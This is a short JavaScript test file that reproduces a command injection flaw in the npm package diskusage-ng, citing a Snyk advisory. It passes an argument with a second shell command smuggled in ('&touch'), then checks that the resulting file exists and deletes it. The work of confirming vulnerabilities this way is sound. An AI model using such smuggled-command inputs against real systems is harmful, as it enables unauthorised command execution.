//https://snyk.io/vuln/SNYK-JS-DISKUSAGENG-564425
test("Command Injection in diskusage-ng", () => 
{
	const root = require("diskusage-ng");
	const fs = require('fs');
	const path = './diskusage-ng';
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
	root( ["\"&touch diskusage-ng\""], function(){});
	
	sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});
